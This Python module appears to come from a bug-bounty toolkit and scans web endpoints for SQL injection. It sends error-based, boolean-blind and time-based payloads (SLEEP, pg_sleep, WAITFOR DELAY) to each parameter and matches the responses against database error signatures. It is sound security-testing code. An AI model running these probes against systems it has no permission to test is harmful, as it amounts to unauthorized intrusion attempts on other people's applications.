#!/usr/bin/env python3
"""
sqli.py — SQL injection detection module (P0)
=============================================

Detects SQL injection on a discovered endpoint parameter using three
techniques, in order of confidence:

  1. **Error-based** — sends quote/syntax-breaking payloads and looks for
     database error signatures in the response (MySQL/Postgres/MSSQL/SQLite/
     Oracle). Highest confidence.
  2. **Boolean-blind** — compares a true conditional vs a false conditional;
     a response difference indicates injectability.
  3. **Time-based blind** — injects a sleep and checks the response latency.

Works on GET (query) and POST (body_form) injection points. Pure send/parse
helpers are unit-testable; only ``test_endpoint`` / ``run_sqli`` do I/O via an
httpx-like async ``client``.

Author : Bug Bounty Toolkit / Layer 0
License : MIT (for authorized use only)
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from typing import Any

try:
    from toolkit.infra.finding import NormalizedFinding, compute_finding_id
    _HAVE_FINDING = True
except Exception:  # pragma: no cover
    _HAVE_FINDING = False


_ERROR_SIGS: dict[str, list[str]] = {
    "MySQL": ["you have an error in your sql syntax", "mysql_fetch",
              "mariadb", "sqlstate\\[hy"],
    "PostgreSQL": ["postgresql", "pg_query", "syntax error at or near",
                   "operator does not exist"],
    "MSSQL": ["microsoft sql server", "unclosed quotation mark",
              "nvarchar", "incorrect syntax near"],
    "SQLite": ["sqlite3.operationalerror", "near \".*\": syntax error",
               "sqlite_error"],
    "Oracle": ["ora-01756", "ora-00933", "ora-00921"],
}


@dataclass
class SqliFinding:
    url: str
    method: str
    param: str
    technique: str          # "error" | "boolean" | "time"
    payload: str
    db_type: str = ""
    evidence: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "url": self.url, "method": self.method, "param": self.param,
            "technique": self.technique, "payload": self.payload,
            "db_type": self.db_type, "evidence": self.evidence,
        }


_ERROR_PAYLOADS = ["'", "\"", "'--", "')", "'}", "')-- "]
_BOOLEAN_TRUE = "' AND '1'='1"
_BOOLEAN_FALSE = "' AND '1'='2"
_TIME_PAYLOADS = [
    ("' AND SLEEP(2)-- ", 2.0),
    ("' AND pg_sleep(2)-- ", 2.0),
    ("'; WAITFOR DELAY '0:0:2'-- ", 2.0),
]


def _detect_db_error(text: str) -> str:
    low = (text or "").lower()
    for db, sigs in _ERROR_SIGS.items():
        for s in sigs:
            if re.search(s, low):
                return db
    return ""


async def _send(client, endpoint: Any, param: str, value: str,
                *, timeout: float = 10.0) -> tuple[int, str, float]:
    url = endpoint.url
    method = endpoint.method
    via = getattr(endpoint, "inject_via", "query")
    headers = {"User-Agent": "Mozilla/5.0 (compatible; BBTK-SQLi/1.0)"}
    t0 = time.monotonic()
    try:
        if via == "body_form":
            r = await client.request(method, url, headers=headers,
                                     data={param: value}, timeout=timeout)
        elif via == "body_json":
            r = await client.request(method, url, headers={**headers,
                                     "Content-Type": "application/json"},
                                     json={param: value}, timeout=timeout)
        else:
            sep = "&" if "?" in url else "?"
            full = f"{url}{sep}{param}={value}"
            r = await client.request(method, full, headers=headers, timeout=timeout)
        body = getattr(r, "text", "") or ""
        status = int(getattr(r, "status_code", 0) or 0)
    except Exception:
        return 0, "", time.monotonic() - t0
    return status, body, time.monotonic() - t0


async def test_endpoint(endpoint: Any, client: object, *,
                        timeout: float = 10.0,
                        time_threshold: float = 1.5) -> list[SqliFinding]:
    """Test every discovered parameter of ``endpoint`` for SQLi."""
    params = list(getattr(endpoint, "params", []) or [])
    if not params:
        return []
    findings: list[SqliFinding] = []
    seen: set[tuple[str, str]] = set()

    for param in params:
        # 1) error-based
        for p in _ERROR_PAYLOADS:
            status, body, _ = await _send(client, endpoint, param, p, timeout=timeout)
            if status and _detect_db_error(body):
                key = (param, "error")
                if key not in seen:
                    seen.add(key)
                    findings.append(SqliFinding(
                        url=endpoint.url, method=endpoint.method, param=param,
                        technique="error", payload=p,
                        db_type=_detect_db_error(body),
                        evidence=body[:200].replace("\n", " ")))
                break

        if (param, "error") in seen:
            continue

        # 2) boolean-blind
        seed = "bbtkz"
        base_s, base_b, _ = await _send(client, endpoint, param, seed, timeout=timeout)
        true_s, true_b, _ = await _send(client, endpoint, param,
                                         seed + _BOOLEAN_TRUE, timeout=timeout)
        false_s, false_b, _ = await _send(client, endpoint, param,
                                          seed + _BOOLEAN_FALSE, timeout=timeout)
        if (true_s == base_s and false_s != base_s) or \
           (true_b == base_b and false_b != base_b and len(false_b) != len(true_b)):
            key = (param, "boolean")
            if key not in seen:
                seen.add(key)
                findings.append(SqliFinding(
                    url=endpoint.url, method=endpoint.method, param=param,
                    technique="boolean", payload=seed + _BOOLEAN_TRUE,
                    evidence=f"true_len={len(true_b)} false_len={len(false_b)}"))

        # 3) time-based blind
        for p, secs in _TIME_PAYLOADS:
            _, _, elapsed = await _send(client, endpoint, param, p, timeout=timeout)
            if elapsed >= time_threshold:
                key = (param, "time")
                if key not in seen:
                    seen.add(key)
                    findings.append(SqliFinding(
                        url=endpoint.url, method=endpoint.method, param=param,
                        technique="time", payload=p,
                        evidence=f"response time {elapsed:.2f}s"))
                break

    return findings


async def run_sqli(endpoints: list[Any], client: object, *,
                   timeout: float = 10.0, concurrency: int = 10) -> list[SqliFinding]:
    """Fan out SQLi testing across all endpoints/params."""
    sem = asyncio.Semaphore(concurrency)

    async def guarded(ep):
        async with sem:
            return await test_endpoint(ep, client, timeout=timeout)

    results = await asyncio.gather(*[guarded(ep) for ep in endpoints])
    return [f for sub in results for f in sub]


def to_normalized_findings(findings: list[SqliFinding],
                           source_tool: str = "sqli.py") -> list[dict]:
    out: list[dict] = []
    for f in findings:
        severity = "HIGH" if f.technique in ("error", "boolean") else "MEDIUM"
        detail = (f"SQL injection via {f.technique} on parameter "
                  f"'{f.param}' ({f.method} {f.url})")
        if f.db_type:
            detail += f" — backend appears to be {f.db_type}"
        if _HAVE_FINDING:
            nf = NormalizedFinding(
                source_tool=source_tool, host=_host(f.url), url=f.url,
                vuln_class_key="SQL_INJECTION", severity=severity,
                title=f"SQL Injection ({f.technique}) in {f.param}",
                detail=detail, evidence=f"payload={f.payload} {f.evidence}",
                confidence="confirmed" if f.technique == "error" else "probable",
            )
            d = nf.to_dict()
        else:
            d = {"source_tool": source_tool, "host": _host(f.url), "url": f.url,
                 "vuln_class_key": "SQL_INJECTION", "severity": severity,
                 "title": f"SQL Injection ({f.technique}) in {f.param}",
                 "detail": detail, "evidence": f.payload,
                 "confidence": "confirmed" if f.technique == "error" else "probable"}
        out.append(d)
    return out


def _host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).netloc
